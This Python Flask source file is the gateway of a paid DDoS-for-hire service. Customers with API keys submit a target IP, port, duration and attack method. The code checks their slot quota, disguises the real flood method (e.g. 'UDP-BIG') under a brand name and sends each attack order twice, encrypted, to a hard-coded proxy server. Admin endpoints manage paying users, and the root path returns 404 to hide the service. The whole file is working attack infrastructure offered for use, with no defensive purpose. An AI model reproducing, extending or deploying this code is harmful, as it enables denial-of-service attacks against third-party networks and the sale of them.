"""
Slot Gateway — DB-backed users + Encrypted forwarding to proxy.py
══════════════════════════════════════════════════════════════════════
- Users stored in MongoDB (persistent, survives redeploys)
- Per-user API keys + slot limits
- Admin REST API to add/edit/delete users + auto-generate keys
- Encrypted (AES-CBC + HMAC) request to proxy.py — never plaintext on wire

Endpoints (USER):
    GET  /api/start?key=KEY&target=IP&port=P&time=T&method=M
    GET  /api/v1/attack/start?key=KEY&host=IP&port=P&time=T&method=M
    GET  /api/slots?key=KEY

Endpoints (ADMIN — header: X-Admin-Token):
    POST /admin/add-user         {name, slots, [key]}        → creates user
    POST /admin/update-user      {key, [name], [slots]}      → edit user
    POST /admin/delete-user      {key}                       → remove user
    POST /admin/reset-slots      {key}                       → free stuck slots
    GET  /admin/list-users                                   → all users
    GET  /admin/audit-log                                    → recent admin actions
"""
import os
import json
import time as time_mod
import threading
import secrets
import hashlib
import hmac
import base64
import requests
from collections import deque, defaultdict
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from pymongo import MongoClient
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

app = Flask(__name__)

# ════════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════════
PORT = int(os.getenv('PORT', '3030'))

# Proxy.py URL
PROXY_URL = os.getenv('PROXY_URL', 'http://52.66.29.214:3030/proxy-attack')

# Encryption keys — MUST match proxy.py
GATEWAY_AES_KEY = os.getenv('GATEWAY_AES_KEY', 'GATEWAY_2024_AES!')[:16].ljust(16, '\0').encode('utf-8')
GATEWAY_HMAC_SECRET = os.getenv('GATEWAY_HMAC_SECRET', 'GATEWAY_HMAC_2024_SECRET').encode('utf-8')

# Admin token (X-Admin-Token header)
ADMIN_TOKEN = os.getenv('ADMIN_TOKEN', 'VKSTARTRAJ')

# MongoDB
MONGO_URI = os.getenv('MONGO_URI', '')
MONGO_DB_NAME = os.getenv('MONGO_DB_NAME', 'slot_gateway')

if not MONGO_URI:
    print("[! WARN] MONGO_URI not set — admin features will fail.")
mongo_client = MongoClient(MONGO_URI) if MONGO_URI else None
db = mongo_client[MONGO_DB_NAME] if mongo_client else None
users_col = db['users'] if db is not None else None
audit_col = db['audit_log'] if db is not None else None


# ════════════════════════════════════════════════════════════════
# ENCRYPTION (shared with proxy.py)
# ════════════════════════════════════════════════════════════════
def encrypt_payload(data_dict):
    """AES-CBC encrypt + HMAC sign. Returns {data, sig}."""
    plaintext = json.dumps(data_dict, separators=(',', ':')).encode('utf-8')
    iv = os.urandom(16)
    cipher = AES.new(GATEWAY_AES_KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plaintext, AES.block_size))
    blob = base64.b64encode(iv + ct).decode('ascii')
    sig = hmac.HMAC(GATEWAY_HMAC_SECRET, blob.encode('ascii'), hashlib.sha256).hexdigest()
    return {'data': blob, 'sig': sig, 'v': 1}


# ════════════════════════════════════════════════════════════════
# SLOT TRACKER (in-memory)
# ════════════════════════════════════════════════════════════════
_lock = threading.Lock()
active_slots = defaultdict(list)
request_log = deque(maxlen=200)


def cleanup_expired(key):
    now = time_mod.time()
    active_slots[key] = [s for s in active_slots[key] if s['expires_at'] > now]


def get_user(key):
    if users_col is None:
        return None
    return users_col.find_one({'key': key}, {'_id': 0})


def get_slot_usage(key, user=None):
    if user is None:
        user = get_user(key)
    if not user:
        return 0, 0, 0
    with _lock:
        cleanup_expired(key)
        active = len(active_slots[key])
    max_s = user.get('slots', 0)
    return active, max_s, max(max_s - active, 0)


def reserve_slot(key, target, duration_sec, max_slots):
    with _lock:
        cleanup_expired(key)
        if len(active_slots[key]) >= max_slots:
            return None
        now = time_mod.time()
        slot_id = f"s_{int(now * 1000)}_{secrets.token_hex(3)}"
        active_slots[key].append({
            'slot_id': slot_id,
            'started_at': now,
            'expires_at': now + duration_sec + 5,
            'target': target,
        })
        return slot_id


def release_slot(key, slot_id):
    with _lock:
        active_slots[key] = [s for s in active_slots[key] if s['slot_id'] != slot_id]


def log_request(endpoint, key, params, status, message, slot_info=''):
    user = get_user(key) if key else None
    request_log.appendleft({
        'time': datetime.utcnow().isoformat() + 'Z',
        'endpoint': endpoint,
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
        'key_short': (key[:18] + '…') if key else '—',
        'user': user.get('name', '—') if user else '—',
        'params': dict(params),
        'status': status,
        'message': message[:200],
        'slot_info': slot_info,
    })


def audit_log(action, admin_ip, details):
    if audit_col is None:
        return
    try:
        audit_col.insert_one({
            'time': datetime.utcnow().isoformat() + 'Z',
            'action': action,
            'admin_ip': admin_ip,
            'details': details,
        })
    except Exception as e:
        print(f"[! WARN] audit log failed: {e}")


# ════════════════════════════════════════════════════════════════
# CORE: validate + reserve slot + encrypted forward
# ════════════════════════════════════════════════════════════════
def handle_attack(endpoint_name, params, target_param):
    key = params.get('key', '').strip()
    target = params.get(target_param, '').strip() or params.get('host', '').strip()
    port = params.get('port', '').strip()
    time_sec = params.get('time', '').strip()
    method_input = params.get('method', 'VISHAL').strip()

    # ─── METHOD MAPPING ───
    # Customer sees "VISHAL" or any custom name.
    # We map it to the real attack method behind the scenes.
    # Add more mappings as needed.
    METHOD_MAP = {
        'VISHAL': os.getenv('REAL_METHOD', 'UDP-BIG'),
        # Add aliases: 'POWER': 'UDP-BYPASS', 'STORM': 'TCP-FLOOD', etc.
    }
    # If input matches a mapped name, use the real method; otherwise pass as-is
    real_method = METHOD_MAP.get(method_input.upper(), method_input)
    # Customer always sees their input name in response, not the real method
    display_method = method_input

    user = get_user(key) if key else None
    if not user:
        log_request(endpoint_name, key, params, 'denied', 'Invalid API key')
        return jsonify({'success': False, 'status': 'error', 'message': 'Invalid API key'}), 401

    if not target or not port or not time_sec:
        log_request(endpoint_name, key, params, 'denied', 'Missing params')
        return jsonify({'success': False, 'status': 'error', 'message': 'Missing required params'}), 400

    # Duration limit (configurable via env, default 300s)
    MAX_DURATION = int(os.getenv('MAX_DURATION', '300'))

    try:
        duration = int(time_sec)
        if duration <= 0:
            raise ValueError
        if duration > MAX_DURATION:
            log_request(endpoint_name, key, params, 'denied', f'Max duration is {MAX_DURATION}s')
            return jsonify({
                'success': False,
                'status': 'error',
                'message': f'Maximum duration is {MAX_DURATION} seconds. You sent {duration}s.',
                'max_duration': MAX_DURATION,
            }), 400
    except Exception:
        log_request(endpoint_name, key, params, 'denied', 'Invalid time')
        return jsonify({'success': False, 'status': 'error', 'message': 'time must be positive integer'}), 400

    max_slots = user.get('slots', 0)
    slot_id = reserve_slot(key, f"{target}:{port}", duration, max_slots)
    if slot_id is None:
        active, _, _ = get_slot_usage(key, user)
        msg = f"Slot limit reached ({active}/{max_slots})"
        log_request(endpoint_name, key, params, 'denied', msg, f"{active}/{max_slots}")
        return jsonify({
            'success': False,
            'status': 'error',
            'message': msg,
            'slots': {'active': active, 'max': max_slots, 'available': 0},
        }), 429

    # Build encrypted payload for proxy.py (sends REAL method)
    payload = {
        'ip': target,
        'port': port,
        'time': time_sec,
        'method': real_method,
        'user': user.get('name', '—'),
        'slot_id': slot_id,
        'ts': int(time_mod.time()),
    }
    encrypted = encrypt_payload(payload)

    # Send 2 parallel requests to proxy (double hit) — but count as 1 slot
    import concurrent.futures

    def _send_to_proxy(enc):
        return requests.post(PROXY_URL, json=enc, timeout=15)

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            f1 = executor.submit(_send_to_proxy, encrypted)
            f2 = executor.submit(_send_to_proxy, encrypt_payload(payload))  # fresh encrypt (different IV)
            r = f1.result(timeout=20)  # use first response for reply
            # ignore f2 result — fire-and-forget

        if r.status_code == 200:
            try:
                proxy_resp = r.json()
            except Exception:
                proxy_resp = {'raw': r.text}
            ok = (
                proxy_resp.get('status') == 'queued'
                or proxy_resp.get('success') is True
            )
            if ok:
                active, _, remaining = get_slot_usage(key, user)
                msg = proxy_resp.get('message', f"Attack queued ({duration}s, {display_method})")
                log_request(endpoint_name, key, params, 'queued', msg, f"{active}/{max_slots}")
                return jsonify({
                    'success': True,
                    'status': 'queued',
                    'message': msg,
                    'target': f"{target}:{port}",
                    'method': display_method,
                    'duration': duration,
                    'queueId': slot_id,
                    'user': user.get('name', '—'),
                    'slots': {'active': active, 'max': max_slots, 'available': remaining},
                })
            release_slot(key, slot_id)
            err = proxy_resp.get('message', 'Proxy rejected')
            log_request(endpoint_name, key, params, 'failed', f"Proxy: {err}")
            return jsonify({'success': False, 'status': 'error', 'message': err}), 502
        release_slot(key, slot_id)
        log_request(endpoint_name, key, params, 'failed', f"Proxy HTTP {r.status_code}")
        return jsonify({'success': False, 'status': 'error', 'message': f"Proxy returned {r.status_code}"}), 502
    except requests.exceptions.Timeout:
        release_slot(key, slot_id)
        log_request(endpoint_name, key, params, 'failed', 'Proxy timeout')
        return jsonify({'success': False, 'status': 'error', 'message': 'Proxy timeout'}), 504
    except Exception as e:
        release_slot(key, slot_id)
        log_request(endpoint_name, key, params, 'failed', f"Forward error: {e}")
        return jsonify({'success': False, 'status': 'error', 'message': f'Gateway error: {e}'}), 500


# ════════════════════════════════════════════════════════════════
# USER ENDPOINTS
# ════════════════════════════════════════════════════════════════
@app.route('/vk/launch')
def vk_launch():
    """Main attack endpoint: /vk/launch?key=vk_xxx&ip=IP&port=P&time=T&method=VISHAL"""
    return handle_attack('/vk/launch', request.args, 'ip')


@app.route('/vk/slots')
def vk_slots():
    key = request.args.get('key', '').strip()
    user = get_user(key) if key else None
    if not user:
        return jsonify({'error': 'Invalid API key'}), 401
    active, max_s, remaining = get_slot_usage(key, user)
    with _lock:
        active_list = list(active_slots[key])
    now = time_mod.time()
    return jsonify({
        'user': user.get('name', '—'),
        'max_slots': max_s,
        'active': active,
        'available': remaining,
        'active_attacks': [
            {
                'target': s['target'],
                'started_ago_sec': int(now - s['started_at']),
                'remaining_sec': max(int(s['expires_at'] - now), 0),
                'slot_id': s['slot_id'],
            }
            for s in active_list
        ],
    })


# ════════════════════════════════════════════════════════════════
# ADMIN ENDPOINTS
# ════════════════════════════════════════════════════════════════
def _admin_check():
    tok = request.headers.get('X-Admin-Token') or request.args.get('token', '')
    return hmac.compare_digest(tok or '', ADMIN_TOKEN)


def _admin_ip():
    return request.headers.get('X-Forwarded-For', request.remote_addr)


def _generate_key():
    return f"vk_{secrets.token_urlsafe(24)}"


@app.route('/admin/add-user', methods=['POST'])
def admin_add_user():
    if not _admin_check():
        return jsonify({'error': 'Unauthorized'}), 401
    if users_col is None:
        return jsonify({'error': 'Database not configured'}), 503
    data = request.get_json(silent=True) or {}
    name = (data.get('name') or '').strip()
    try:
        slots = int(data.get('slots', 0))
    except Exception:
        return jsonify({'error': 'slots must be integer'}), 400
    if not name or slots <= 0:
        return jsonify({'error': 'name and slots (>0) are required'}), 400
    custom_key = (data.get('key') or '').strip()
    if custom_key:
        if not custom_key.startswith('vk_') or len(custom_key) < 8:
            return jsonify({'error': 'custom key must start with vk_ and be ≥8 chars'}), 400
        if users_col.find_one({'key': custom_key}):
            return jsonify({'error': 'key already exists'}), 409
        new_key = custom_key
    else:
        # Generate unique random key
        for _ in range(5):
            new_key = _generate_key()
            if not users_col.find_one({'key': new_key}):
                break
        else:
            return jsonify({'error': 'Could not generate unique key'}), 500

    user = {
        'key': new_key,
        'name': name,
        'slots': slots,
        'created_at': datetime.utcnow().isoformat() + 'Z',
        'created_by_ip': _admin_ip(),
        'enabled': True,
    }
    users_col.insert_one(user)
    user.pop('_id', None)
    audit_log('add_user', _admin_ip(), {'key_short': new_key[:18] + '…', 'name': name, 'slots': slots})
    return jsonify({'success': True, 'user': user})


@app.route('/admin/update-user', methods=['POST'])
def admin_update_user():
    if not _admin_check():
        return jsonify({'error': 'Unauthorized'}), 401
    if users_col is None:
        return jsonify({'error': 'Database not configured'}), 503
    data = request.get_json(silent=True) or {}
    key = (data.get('key') or '').strip()
    if not key:
        return jsonify({'error': 'key is required'}), 400
    user = users_col.find_one({'key': key})
    if not user:
        return jsonify({'error': 'user not found'}), 404
    updates = {}
    if 'name' in data and str(data['name']).strip():
        updates['name'] = str(data['name']).strip()
    if 'slots' in data:
        try:
            s = int(data['slots'])
            if s <= 0:
                raise ValueError
            updates['slots'] = s
        except Exception:
            return jsonify({'error': 'slots must be positive integer'}), 400
    if 'enabled' in data:
        updates['enabled'] = bool(data['enabled'])
    if not updates:
        return jsonify({'error': 'nothing to update'}), 400
    updates['updated_at'] = datetime.utcnow().isoformat() + 'Z'
    users_col.update_one({'key': key}, {'$set': updates})
    audit_log('update_user', _admin_ip(), {'key_short': key[:18] + '…', 'updates': updates})
    new_user = users_col.find_one({'key': key}, {'_id': 0})
    return jsonify({'success': True, 'user': new_user})


@app.route('/admin/delete-user', methods=['POST'])
def admin_delete_user():
    if not _admin_check():
        return jsonify({'error': 'Unauthorized'}), 401
    if users_col is None:
        return jsonify({'error': 'Database not configured'}), 503
    data = request.get_json(silent=True) or {}
    key = (data.get('key') or '').strip()
    if not key:
        return jsonify({'error': 'key is required'}), 400
    res = users_col.delete_one({'key': key})
    if res.deleted_count == 0:
        return jsonify({'error': 'user not found'}), 404
    # Free any slots
    with _lock:
        active_slots.pop(key, None)
    audit_log('delete_user', _admin_ip(), {'key_short': key[:18] + '…'})
    return jsonify({'success': True, 'message': 'User deleted'})


@app.route('/admin/reset-slots', methods=['POST'])
def admin_reset_slots():
    if not _admin_check():
        return jsonify({'error': 'Unauthorized'}), 401
    data = request.get_json(silent=True) or {}
    key = (data.get('key') or '').strip()
    if not key:
        return jsonify({'error': 'key is required'}), 400
    with _lock:
        active_slots.pop(key, None)
    audit_log('reset_slots', _admin_ip(), {'key_short': key[:18] + '…'})
    return jsonify({'success': True, 'message': 'Slots cleared'})


@app.route('/admin/list-users')
def admin_list_users():
    if not _admin_check():
        return jsonify({'error': 'Unauthorized'}), 401
    if users_col is None:
        return jsonify({'error': 'Database not configured'}), 503
    users = list(users_col.find({}, {'_id': 0}))
    now = time_mod.time()
    out = []
    for u in users:
        k = u['key']
        with _lock:
            cleanup_expired(k)
            atks = list(active_slots[k])
        out.append({
            **u,
            'key_short': k[:18] + '…',
            'active': len(atks),
            'attacks': [
                {'target': a['target'], 'remaining_sec': max(int(a['expires_at'] - now), 0)}
                for a in atks
            ],
        })
    return jsonify({'total': len(out), 'users': out})


@app.route('/admin/audit-log')
def admin_audit_log_view():
    if not _admin_check():
        return jsonify({'error': 'Unauthorized'}), 401
    if audit_col is None:
        return jsonify({'error': 'Database not configured'}), 503
    logs = list(audit_col.find({}, {'_id': 0}).sort('time', -1).limit(100))
    return jsonify({'total': len(logs), 'logs': logs})


# ════════════════════════════════════════════════════════════════
# Misc
# ════════════════════════════════════════════════════════════════
@app.route('/health')
def health():
    """Minimal health — only status, no internals exposed."""
    return jsonify({'status': 'ok'})


@app.route('/logs')
def logs_view():
    """Logs only accessible with admin token."""
    if not _admin_check():
        return '', 404
    return render_template_string(LOGS_TEMPLATE, logs=list(request_log))


LOGS_TEMPLATE = '''<!doctype html><html><head><meta charset="utf-8"><title>Logs</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#f3f4f6;margin:0;padding:24px}
h1{color:#818cf8;font-size:22px;margin-bottom:6px}
.sub{color:#9ca3af;font-size:13px;margin-bottom:14px}
table{width:100%;border-collapse:collapse;background:#1a1d2e;border-radius:8px;overflow:hidden}
th{text-align:left;padding:10px 14px;font-size:11px;color:#9ca3af;text-transform:uppercase;background:#252938;border-bottom:1px solid #3a3f54}
td{padding:9px 14px;font-size:12px;border-bottom:1px solid #252938;color:#e5e7eb}
.queued{color:#10b981;font-weight:700}.denied{color:#fbbf24;font-weight:700}.failed{color:#f87171;font-weight:700}
.mono{font-family:'Cascadia Code',monospace;font-size:11px;color:#a78bfa}
.empty{padding:40px;text-align:center;color:#6b7280}
.refresh{background:#6366f1;color:#fff;text-decoration:none;padding:8px 16px;border-radius:6px;font-size:13px;font-weight:600}
</style></head><body>
<h1>Logs</h1>
<p class="sub">Last {{ logs|length }} requests</p>
<a class="refresh" href="/logs?token={{ request.args.get('token','') }}">Refresh</a>
<table>
<thead><tr><th>Time</th><th>User</th><th>Target</th><th>Status</th><th>Slots</th><th>Message</th></tr></thead>
<tbody>
{% for log in logs %}<tr>
<td class="mono">{{ log.time[11:19] }}</td>
<td>{{ log.user }}</td>
<td>{{ log.params.get('ip') or log.params.get('host') or log.params.get('target', '') }}:{{ log.params.get('port', '') }}</td>
<td class="{{ log.status }}">{{ log.status|upper }}</td>
<td class="mono">{{ log.slot_info }}</td>
<td>{{ log.message[:60] }}</td>
</tr>{% else %}<tr><td colspan="6" class="empty">No requests yet.</td></tr>{% endfor %}
</tbody></table></body></html>'''


@app.route('/')
def index():
    """Return nothing — hide the service existence."""
    return '', 404


# ════════════════════════════════════════════════════════════════
# KEEP-ALIVE (prevents Render free-tier spin-down)
# ════════════════════════════════════════════════════════════════
import threading

def _keep_alive_ping():
    """Ping /health every 4 minutes to prevent Render idle shutdown."""
    import time as _t
    while True:
        _t.sleep(240)
        try:
            r = requests.get(f"http://localhost:{PORT}/health", timeout=5)
            if r.status_code == 200:
                print(f"[✓ Keep-Alive] Ping OK at {datetime.utcnow().isoformat()}")
        except Exception as e:
            print(f"[! Keep-Alive] {e}")

def start_keep_alive():
    if os.getenv('DISABLE_KEEP_ALIVE', '').lower() != 'true':
        t = threading.Thread(target=_keep_alive_ping, daemon=True)
        t.start()
        print("[✓ Keep-Alive] Started — pinging every 4 min")
    else:
        print("[! Keep-Alive] Disabled via env var")


if __name__ == '__main__':
    start_keep_alive()
    print(f"[✓] Slot Gateway v3 (encrypted) starting on port {PORT}")
    print(f"[✓] Proxy URL: {PROXY_URL}")
    print(f"[✓] DB: {'connected' if db is not None else 'NOT CONFIGURED'}")
    print(f"[✓] Encryption: AES-128-CBC + HMAC-SHA256")
    print(f"[✓] Admin token configured: {'yes' if ADMIN_TOKEN != 'admin_change_me_2024' else 'DEFAULT - CHANGE ADMIN_TOKEN!'}")
    app.run(host='0.0.0.0', port=PORT, debug=False)
